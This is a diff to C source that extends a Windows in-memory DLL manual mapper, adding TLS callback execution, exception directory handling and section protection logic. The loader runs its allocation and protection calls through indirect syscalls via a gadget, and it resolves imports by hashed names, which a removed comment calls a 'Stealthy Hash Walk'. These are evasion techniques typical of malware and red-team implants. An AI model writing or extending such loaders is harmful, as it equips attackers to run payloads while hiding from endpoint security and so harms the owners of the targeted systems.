@@ -24,7 +24,21 @@ extern API_TABLE g_ApiTable;
 // MANUAL MAPPER CORE
 // =============================================================================
 
-static PVOID ManualMap(PVOID pRawDll, SIZE_T dllSize, BOOL execEntry) {
+// Estructura extendida para TLS y excepciones
+typedef struct _MANUAL_MAP_CONTEXT_EXTENDED {
+    PVOID BaseAddress;
+    PIMAGE_NT_HEADERS NtHeaders;
+    PIMAGE_SECTION_HEADER TextSection;
+    SIZE_T RegionSize;
+    // TLS Callbacks
+    PIMAGE_TLS_DIRECTORY TlsDir;
+    BOOLEAN TlsCallbacksExecuted;
+    // Exception Directory
+    PIMAGE_RUNTIME_FUNCTION_ENTRY ExceptionDir;
+    DWORD ExceptionDirCount;
+} MANUAL_MAP_CONTEXT_EXTENDED, *PMANUAL_MAP_CONTEXT_EXTENDED;
+
+static PVOID ManualMapExtended(PVOID pRawDll, SIZE_T dllSize, BOOL execEntry, PMANUAL_MAP_CONTEXT_EXTENDED ctxOut) {
     PIMAGE_DOS_HEADER pDos = (PIMAGE_DOS_HEADER)pRawDll;
     if (pDos->e_magic != IMAGE_DOS_SIGNATURE) return NULL;
 
@@ -39,7 +53,6 @@ static PVOID ManualMap(PVOID pRawDll, SIZE_T dllSize, BOOL execEntry) {
         g_SyscallGadget, (HANDLE)-1, &pImageBase, 0, &imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
     
     if (status != 0) {
-        // Fallback: system-selected base
         pImageBase = NULL;
         status = InvokeSyscall(g_ApiTable.syscalls.NtAllocateVirtualMemory.ssn,
             g_SyscallGadget, (HANDLE)-1, &pImageBase, 0, &imageSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
@@ -79,69 +92,81 @@ static PVOID ManualMap(PVOID pRawDll, SIZE_T dllSize, BOOL execEntry) {
         }
     }
 
-    // 5. Resolve Imports (Stealthy Hash Walk)
+    // 5. Resolve Imports
     PIMAGE_DATA_DIRECTORY importDir = &pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];
     if (importDir->Size > 0) {
         PIMAGE_IMPORT_DESCRIPTOR pImport = (PIMAGE_IMPORT_DESCRIPTOR)((PBYTE)pImageBase + importDir->VirtualAddress);
         while (pImport->Name) {
             const char* moduleName = (const char*)((PBYTE)pImageBase + pImport->Name);
-            
-            // Generate hash for module lookup
-            TRIPLE_HASH modHash = GenerateTripleHashA(moduleName, TRUE);
-            PVOID hMod = GetModuleBaseByHash(modHash);
-            
-            if (!hMod) {
-                // If not loaded, we might need a loader fallback or fail
-                // In production, we'd ensure dependencies are already mapped or side-loaded
-                pImport++;
-                continue;
-            }
-
-            PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)((PBYTE)pImageBase + pImport->FirstThunk);
-            PIMAGE_THUNK_DATA pOrig = (pImport->OriginalFirstThunk) ? 
-                (PIMAGE_THUNK_DATA)((PBYTE)pImageBase + pImport->OriginalFirstThunk) : pThunk;
-
-            while (pOrig->u1.AddressOfData) {
-                if (IMAGE_SNAP_BY_ORDINAL(pOrig->u1.Ordinal)) {
-                    // Ordinal resolution (simplified for now)
-                    pThunk->u1.Function = 0; 
-                } else {
-                    PIMAGE_IMPORT_BY_NAME pName = (PIMAGE_IMPORT_BY_NAME)((PBYTE)pImageBase + pOrig->u1.AddressOfData);
-                    TRIPLE_HASH funcHash = GenerateTripleHashA((const char*)pName->Name, FALSE);
-                    pThunk->u1.Function = (ULONG_PTR)ResolveApiByHash(hMod, funcHash);
+            PVOID hMod = GetModuleBaseByHash(GenerateTripleHashA(moduleName, TRUE));
+            if (hMod) {
+                PIMAGE_THUNK_DATA pThunk = (PIMAGE_THUNK_DATA)((PBYTE)pImageBase + pImport->FirstThunk);
+                PIMAGE_THUNK_DATA pOrig = (pImport->OriginalFirstThunk) ? (PIMAGE_THUNK_DATA)((PBYTE)pImageBase + pImport->OriginalFirstThunk) : pThunk;
+                while (pOrig->u1.AddressOfData) {
+                    if (IMAGE_SNAP_BY_ORDINAL(pOrig->u1.Ordinal)) {
+                        // Ordinal resolution logic could go here
+                    } else {
+                        PIMAGE_IMPORT_BY_NAME pName = (PIMAGE_IMPORT_BY_NAME)((PBYTE)pImageBase + pOrig->u1.AddressOfData);
+                        pThunk->u1.Function = (ULONG_PTR)ResolveApiByHash(hMod, GenerateTripleHashA((const char*)pName->Name, FALSE));
+                    }
+                    pThunk++; pOrig++;
                 }
-                pThunk++;
-                pOrig++;
             }
             pImport++;
         }
     }
 
-    // 6. Finalize Section Protections
+    // 6. TLS and Exception Directories
+    DWORD tlsRva = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_TLS].VirtualAddress;
+    if (tlsRva && ctxOut) {
+        ctxOut->TlsDir = (PIMAGE_TLS_DIRECTORY)((PBYTE)pImageBase + tlsRva);
+    }
+
+    DWORD excepRva = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].VirtualAddress;
+    DWORD excepSize = pNt->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXCEPTION].Size;
+    if (excepRva && excepSize && ctxOut) {
+        ctxOut->ExceptionDir = (PIMAGE_RUNTIME_FUNCTION_ENTRY)((PBYTE)pImageBase + excepRva);
+        ctxOut->ExceptionDirCount = excepSize / sizeof(IMAGE_RUNTIME_FUNCTION_ENTRY);
+    }
+
+    // 7. Finalize Section Protections
     for (WORD i = 0; i < pNt->FileHeader.NumberOfSections; i++) {
         PVOID pAddr = (PBYTE)pImageBase + pSec[i].VirtualAddress;
         SIZE_T sSize = pSec[i].Misc.VirtualSize;
-        ULONG prot = PAGE_READONLY;
+        ULONG prot = (pSec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) ? ((pSec[i].Characteristics & IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ) : ((pSec[i].Characteristics & IMAGE_SCN_MEM_WRITE) ? PAGE_READWRITE : PAGE_READONLY);
         ULONG oldProt = 0;
-
-        if (pSec[i].Characteristics & IMAGE_SCN_MEM_EXECUTE) {
-            prot = (pSec[i].Characteristics & IMAGE_SCN_MEM_WRITE) ? PAGE_EXECUTE_READWRITE : PAGE_EXECUTE_READ;
-        } else if (pSec[i].Characteristics & IMAGE_SCN_MEM_WRITE) {
-            prot = PAGE_READWRITE;
-        }
-
-        InvokeSyscall(g_ApiTable.syscalls.NtProtectVirtualMemory.ssn,
-            g_SyscallGadget, (HANDLE)-1, &pAddr, &sSize, prot, &oldProt);
+        InvokeSyscall(g_ApiTable.syscalls.NtProtectVirtualMemory.ssn, g_SyscallGadget, (HANDLE)-1, &pAddr, &sSize, prot, &oldProt);
     }
 
-    // 7. Call DllMain
+    // 8. Execute TLS callbacks
+    if (ctxOut && ctxOut->TlsDir && ctxOut->TlsDir->AddressOfCallBacks) {
+        PIMAGE_TLS_CALLBACK* callbacks = (PIMAGE_TLS_CALLBACK*)(ctxOut->TlsDir->AddressOfCallBacks);
+        for (int i = 0; callbacks[i]; i++) {
+            callbacks[i](pImageBase, DLL_PROCESS_ATTACH, NULL);
+        }
+        ctxOut->TlsCallbacksExecuted = TRUE;
+    }
+
+    // 9. Call DllMain
     if (execEntry && pNt->OptionalHeader.AddressOfEntryPoint) {
         typedef BOOL (WINAPI* DllMain_t)(HINSTANCE, DWORD, LPVOID);
         DllMain_t dllMain = (DllMain_t)((PBYTE)pImageBase + pNt->OptionalHeader.AddressOfEntryPoint);
         dllMain((HINSTANCE)pImageBase, DLL_PROCESS_ATTACH, NULL);
     }
 
+    if (ctxOut) {
+        ctxOut->BaseAddress = pImageBase;
+        ctxOut->NtHeaders = pNt;
+        ctxOut->RegionSize = imageSize;
+    }
+
     return pImageBase;
+}
+
+// Legacy wrapper
+static PVOID ManualMap(PVOID pRawDll, SIZE_T dllSize, BOOL execEntry) {
+    MANUAL_MAP_CONTEXT_EXTENDED ctx = {0};
+    return ManualMapExtended(pRawDll, dllSize, execEntry, &ctx);
 }
 
 #endif
